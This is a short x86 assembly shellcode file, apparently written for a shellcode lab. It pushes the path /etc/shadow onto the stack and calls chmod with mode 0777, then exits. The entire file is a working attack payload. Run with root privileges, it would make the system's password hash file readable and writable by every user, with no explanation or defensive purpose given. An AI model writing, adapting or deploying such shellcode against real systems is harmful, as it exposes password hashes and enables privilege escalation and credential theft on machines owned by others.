; shellcodelab@hack4
; by dash

BITS 32
global _start

_start:
xor     eax, eax
xor     ebx, ebx
xor     ecx, ecx

;chmod
mov     ecx, 0x1ff      ;0777
push    ebx             ;null terminator
push    0x776f6461      ;/etc/shadow
push    0x68732f63
push    0x74652f2f
mov     ebx, esp        ;put the address of esp to ebx (shadow)
mov     eax, 15
int     0x80

;exit
xor     eax, eax
xor     ebx, ebx
mov     eax, 1
int     0x80

